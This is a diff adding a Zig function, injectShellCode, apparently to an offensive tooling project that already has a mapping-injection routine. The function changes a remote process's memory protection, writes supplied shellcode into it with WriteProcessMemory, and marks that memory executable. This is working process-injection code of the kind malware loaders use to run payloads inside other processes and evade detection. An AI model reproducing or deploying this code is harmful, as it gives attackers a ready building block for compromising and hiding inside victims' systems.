@@ -167,3 +167,41 @@ pub fn mapInject(h_process: HANDLE, shell_code: []const u8) !struct {
 
     return .{ .map_local_address = map_local_address, .map_remote_address = map_remote_address };
 }
+
+pub fn injectShellCode(h_process: HANDLE, address: *anyopaque, shell_code: []const u8) !void {
+    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
+
+    if (VirtualProtectEx(
+        h_process,
+        address,
+        shell_code.len,
+        .{ .PAGE_READWRITE = 1 },
+        &old_protection,
+    ) == 0) {
+        std.debug.print("[!] VirtualProtectEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
+        return error.VirtualProtectExFailed;
+    }
+
+    var num_of_bytes_written: usize = 0;
+    if (WriteProcessMemory(
+        h_process,
+        address,
+        shell_code.ptr,
+        shell_code.len,
+        &num_of_bytes_written,
+    ) == 0 or num_of_bytes_written != shell_code.len) {
+        std.debug.print("[!] WriteProcessMemory Failed With Error: {s}\n", .{@tagName(GetLastError())});
+        return error.WriteProcessMemoryFailed;
+    }
+
+    if (VirtualProtectEx(
+        h_process,
+        address,
+        shell_code.len,
+        .{ .PAGE_EXECUTE_READWRITE = 1 },
+        &old_protection,
+    ) == 0) {
+        std.debug.print("[!] VirtualProtectEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
+        return error.VirtualProtectExFailed;
+    }
+}
